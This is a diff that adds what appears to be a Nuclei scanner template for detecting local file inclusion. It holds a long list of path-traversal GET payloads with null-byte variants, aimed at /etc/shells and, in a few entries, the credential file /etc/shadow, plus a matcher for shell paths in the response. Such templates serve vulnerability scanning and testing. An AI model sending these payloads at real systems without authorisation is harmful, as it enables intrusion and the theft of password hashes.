@@ -1,0 +1,70 @@
+id: LFI
+
+info:
+  name: Local File Inclusion
+  author: 0x71rex
+  severity: high
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/etc/shells'
+      - '{{BaseURL}}/etc/shadow%00'
+      - '{{BaseURL}}/etc/shells'
+      - '{{BaseURL}}/etc/shells%00'
+      - '{{BaseURL}}../etc/shells'
+      - '{{BaseURL}}../etc/shells%00'
+      - '{{BaseURL}}../../etc/shells'
+      - '{{BaseURL}}../../etc/shells%00'
+      - '{{BaseURL}}../../../etc/shells'
+      - '{{BaseURL}}../../../etc/shells%00'
+      - '{{BaseURL}}../../../../etc/shells'
+      - '{{BaseURL}}../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00'
+      - '{{BaseURL}}../../../../../../etc/shells&=%3C%3C%3C%3C'
+
+    matchers:
+      - type: word
+        words:
+          - "# valid login shells"
+          - "/bin/sh"
+          - "/bin/ash"
+          - "/bin/bash"
+        condition: and
+        part: body
